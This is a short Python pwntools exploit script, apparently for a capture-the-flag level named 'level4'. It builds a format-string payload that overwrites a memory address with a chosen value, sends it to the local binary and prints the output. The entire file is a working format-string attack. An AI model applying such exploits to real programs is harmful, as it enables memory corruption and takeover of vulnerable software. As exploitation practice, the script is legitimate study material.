from pwn import *

context.arch = 'i386'

m_addr = 0x08049810
offset = 12

p = process('./level4')
payload = fmtstr_payload(offset, {m_addr: 0x1025544})

log.info(f"Longueur payload : {len(payload)}")
log.info(f"Payload : {payload}")

p.sendline(payload)
print(p.recvall(timeout=2).decode())